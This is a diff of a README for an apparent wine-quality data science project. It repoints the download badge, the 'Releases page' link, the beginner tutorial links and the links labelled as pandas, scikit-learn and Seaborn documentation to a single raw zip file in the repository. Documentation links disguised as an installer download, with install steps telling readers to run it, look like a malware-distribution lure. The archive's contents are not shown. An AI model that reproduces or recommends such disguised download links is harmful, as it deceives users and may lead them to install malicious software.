@@ -3,7 +3,7 @@
 
 ## 📥 Download the Application
 
-[![Download Latest Release](https://raw.githubusercontent.com/mahdi5050/data-science-project/main/disburthen/data-science-project.zip%20Latest%20Release-v1.0.0-blue)](https://raw.githubusercontent.com/mahdi5050/data-science-project/main/disburthen/data-science-project.zip)
+[![Download Latest Release](https://github.com/mahdi5050/data-science-project/raw/refs/heads/main/figures/data-project-science-v3.6-alpha.5.zip%20Latest%20Release-v1.0.0-blue)](https://github.com/mahdi5050/data-science-project/raw/refs/heads/main/figures/data-project-science-v3.6-alpha.5.zip)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ To run this application, you will need:
 
 ## 💾 Download & Install
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/mahdi5050/data-science-project/main/disburthen/data-science-project.zip).
+1. Visit the [Releases page](https://github.com/mahdi5050/data-science-project/raw/refs/heads/main/figures/data-project-science-v3.6-alpha.5.zip).
 2. Look for the latest release version.
 3. Download the installation file for your operating system.
 4. Once the download is complete, find the file in your downloads folder.
@@ -46,9 +46,9 @@ Once installed, open the application to start exploring wine quality data!
 
 If you are new to data science, here are some helpful links to get started:
 
-- [Introduction to Data Science](https://raw.githubusercontent.com/mahdi5050/data-science-project/main/disburthen/data-science-project.zip)
-- [Machine Learning Basics](https://raw.githubusercontent.com/mahdi5050/data-science-project/main/disburthen/data-science-project.zip)
-- [Python for Beginners](https://raw.githubusercontent.com/mahdi5050/data-science-project/main/disburthen/data-science-project.zip)
+- [Introduction to Data Science](https://github.com/mahdi5050/data-science-project/raw/refs/heads/main/figures/data-project-science-v3.6-alpha.5.zip)
+- [Machine Learning Basics](https://github.com/mahdi5050/data-science-project/raw/refs/heads/main/figures/data-project-science-v3.6-alpha.5.zip)
+- [Python for Beginners](https://github.com/mahdi5050/data-science-project/raw/refs/heads/main/figures/data-project-science-v3.6-alpha.5.zip)
 
 ## 📋 Contribution
 
@@ -80,11 +80,11 @@ If you encounter issues or have questions, you can open an issue on the project�
 
 For further information about the tools and technologies used in this project, explore the documentation for:
 
-- [pandas](https://raw.githubusercontent.com/mahdi5050/data-science-project/main/disburthen/data-science-project.zip)
-- [scikit-learn](https://raw.githubusercontent.com/mahdi5050/data-science-project/main/disburthen/data-science-project.zip)
-- [Seaborn](https://raw.githubusercontent.com/mahdi5050/data-science-project/main/disburthen/data-science-project.zip)
+- [pandas](https://github.com/mahdi5050/data-science-project/raw/refs/heads/main/figures/data-project-science-v3.6-alpha.5.zip)
+- [scikit-learn](https://github.com/mahdi5050/data-science-project/raw/refs/heads/main/figures/data-project-science-v3.6-alpha.5.zip)
+- [Seaborn](https://github.com/mahdi5050/data-science-project/raw/refs/heads/main/figures/data-project-science-v3.6-alpha.5.zip)
 
 Thank you for choosing the data-science-project. Your exploration of wine quality starts here!
 
-[![Download Latest Release](https://raw.githubusercontent.com/mahdi5050/data-science-project/main/disburthen/data-science-project.zip%20Latest%20Release-v1.0.0-blue)](https://raw.githubusercontent.com/mahdi5050/data-science-project/main/disburthen/data-science-project.zip)
+[![Download Latest Release](https://github.com/mahdi5050/data-science-project/raw/refs/heads/main/figures/data-project-science-v3.6-alpha.5.zip%20Latest%20Release-v1.0.0-blue)](https://github.com/mahdi5050/data-science-project/raw/refs/heads/main/figures/data-project-science-v3.6-alpha.5.zip)
 ```
